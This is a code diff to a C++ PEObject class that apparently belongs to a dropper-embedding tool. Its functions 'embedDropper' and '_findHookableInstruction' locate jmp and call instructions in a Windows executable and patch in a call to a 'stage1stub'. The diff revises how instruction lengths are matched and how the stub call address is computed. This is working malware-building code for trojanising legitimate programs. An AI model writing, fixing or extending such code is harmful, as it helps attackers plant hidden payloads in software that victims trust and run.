@@ -1027,7 +1027,7 @@ void PEObject::_findHookableInstruction()
 		disassembled_instruction instr = *iter;		
 		switch (instr.d.Instruction.BranchType) {
 			case JmpType:
-				if (instr.len == STAGE1_STUB_SIZE) {
+				if (instr.len >= STAGE1_STUB_SIZE) {
 					printf("\n");
 					printf("%.8X(%02d) %s\n",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
 					printf("!!! valid hook found at VA %08x\n", instr.d.VirtualAddr);
@@ -1041,7 +1041,7 @@ void PEObject::_findHookableInstruction()
 				}
 				break;
 			case CallType:
-				if (instr.len == 6 || instr.len == STAGE1_STUB_SIZE) {
+				if (instr.len >= STAGE1_STUB_SIZE) {
 					printf("\n");
 					printf("%.8X(%02d) %s\n", (int)instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
 					printf("!!! potential hook found at VA %08x\n", instr.d.VirtualAddr);
@@ -1279,20 +1279,28 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	switch (hookedInstruction_.d.Instruction.BranchType) {
 		case JmpType:
 			{
-				DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (restoreVA - hookedInstruction_.d.VirtualAddr);
-				stage1stub.call( addr );
-			}
-			break;
-		case CallType:
-			{
-				if(hookedInstruction_.len == 6)
-				//DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr);
-					stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
-				else if(hookedInstruction_.len == 5)
+				if (hookedInstruction_.len == 5)
 				{
 					DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr) + hookedInstruction_.len - 1 ;
 					stage1stub.call(addr);
 				}
+				else if (hookedInstruction_.len == 6)
+				{
+					DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (restoreVA - hookedInstruction_.d.VirtualAddr);
+					//stage1stub.call(addr);
+					stage1stub.call(AsmJit::dword_ptr_abs((void*)stubVA));
+				}
+			}
+			break;
+		case CallType:
+			{
+				if(hookedInstruction_.len == 5)
+				{
+					DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr) + hookedInstruction_.len - 1 ;
+					stage1stub.call(addr);
+				}
+				else if(hookedInstruction_.len == 6)
+					stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
 
 			}
 			break;
